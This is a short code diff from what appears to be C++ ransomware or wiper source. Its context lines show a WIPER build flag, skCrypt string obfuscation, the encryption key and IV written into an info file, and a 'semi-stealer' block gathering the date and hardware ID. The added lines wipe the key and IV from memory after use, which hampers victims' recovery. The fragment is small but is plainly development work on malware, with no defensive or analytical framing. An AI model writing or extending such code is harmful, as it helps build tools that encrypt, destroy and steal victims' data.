@@ -107,6 +107,11 @@ int main(int argc, char* argv[]) {
 #if !WIPER
     info_txt += (string)skCrypt("Key: ") + key + (string)skCrypt("\\") + iv + (string)skCrypt("\n");
 #endif
+
+    // delete sensitive data
+    key = "";
+    iv = "";
+
 #if STEAL_INFO   // semi-stealer
     info_txt += (string)skCrypt("Date: ") + GetDate() + (string)skCrypt("\n");
     info_txt += (string)skCrypt("HWID: ") + GetHWID() + (string)skCrypt("\n");
